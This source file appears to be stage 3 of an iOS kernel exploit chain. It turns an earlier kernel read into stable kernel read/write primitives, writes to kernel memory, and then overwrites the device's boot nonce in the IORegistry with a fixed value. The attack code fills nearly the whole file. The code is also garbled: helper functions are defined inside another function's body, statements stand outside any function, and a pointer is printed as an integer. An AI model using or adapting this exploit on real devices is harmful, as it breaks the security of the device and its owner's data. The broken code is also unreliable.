//
//  stage3.c
//  Desc Race Test
//
//  Created by tihmstar on 05.03.22.
//

#include "stage3.h"
#include "KernelRW.hpp"
#include <unistd.h>
#include "iokit.h"

extern "C"{
#include "spray_stuff.h"
};

#define MAKE_KPTR(v) (v | 0xffffff8000000000)

extern uint64_t gPtr;
#define VM_obj_off 0x100
#define IOSurface_off 0x300

void DumpHex(const void* data, size_t size) {
    char ascii[17];
    size_t i, j;
    ascii[16] = '\0';
    for (i = 0; i < size; ++i) {
        printf("%02X ", ((unsigned char*)data)[i]);
        if (((unsigned char*)data)[i] >= ' ' && ((unsigned char*)data)[i] <= '~') {
            ascii[i % 16] = ((unsigned char*)data)[i];
        } else {
            ascii[i % 16] = '.';
        }
        if ((i+1) % 8 == 0 || i+1 == size) {
            printf(" ");
            if ((i+1) % 16 == 0) {
                printf("|  %s \n", ascii);
            } else if (i+1 == size) {
                ascii[(i+1) % 16] = '\0';
                if ((i+1) % 16 <= 8) {
                    printf(" ");
                }
                for (j = (i+1) % 16; j < 16; ++j) {
                    printf("   ");
                }
                printf("|  %s \n", ascii);
            }
        }
    }
}


extern "C" void stage3(uint64_t backupWhere, uint64_t backupWhat){
    KernelRW *newKrw = new KernelRW;

    uint64_t machTaskSelfAddr = kread64(backupWhat + 0x70);
    printf("machTaskSelfAddr=0x%016llx\n",machTaskSelfAddr);
    
    printf("getting stable RW primitives\n");
    auto p = newKrw->getPrimitivepatches(kread64, machTaskSelfAddr);
    
    printf("performing write!\n");
    early_kwrite64_public(p.where, p.what);
    printf("stable kernel RW now initiated!\n");
    
    if (backupWhere) {
        printf("Detected stage 3 cleanup, performing!\n");
        newKrw->kwrite64(backupWhere, backupWhat);
    }

char * convertCFStrToChar(CFStringRef aString) {
  if (aString == NULL) {
    return NULL;
  }

  CFIndex length = CFStringGetLength(aString);
  CFIndex maxSize =
  CFStringGetMaximumSizeForEncoding(length, kCFStringEncodingUTF8) + 1;
  char *buffer = (char *)malloc(maxSize);
  if (CFStringGetCString(aString, buffer, maxSize,
                         kCFStringEncodingUTF8)) {
    return buffer;
  }
  free(buffer); // If we failed
  return NULL;
}

CFStringRef kBootNonceKeyCFSTR = CFSTR("com.apple.System.boot-nonce");
char* getNonce(void) {
    io_registry_entry_t registry_entry = IORegistryEntryFromPath(kIOMasterPortDefault, "IODeviceTree:/options");
    

    CFTypeRef typRef = IORegistryEntryCreateCFProperty(registry_entry, kBootNonceKeyCFSTR, kCFAllocatorDefault, 0);
    
    CFStringRef desc = CFCopyDescription(typRef);
    
    return convertCFStrToChar(desc);
}


kern_return_t setNonce(const char* nonceStr) {
    io_registry_entry_t registry_entry = IORegistryEntryFromPath(kIOMasterPortDefault, "IODeviceTree:/options");
    if (registry_entry == 0) {
        return KERN_FAILURE;
    }
    
    CFStringRef nonceRef = CFStringCreateWithCString(kCFAllocatorDefault, nonceStr, kCFStringEncodingUTF8);
    
    return IORegistryEntrySetCFProperty(registry_entry, kBootNonceKeyCFSTR, nonceRef);
}

    

printf("current nonce: %d\n", getNonce());
kern_return_t s = setNonce("0x1111111111111111");
if (s == KERN_SUCCESS) {
  printf("successfully set nonce\n");
  printf("new nonce: %d\n", getNonce()); // just to check again
} else {
  printf("couldn't set nonce\n Error: %s", mach_error_string(s));
}

    
    printf("why are we still alive???\n");
    
    printf("");
}

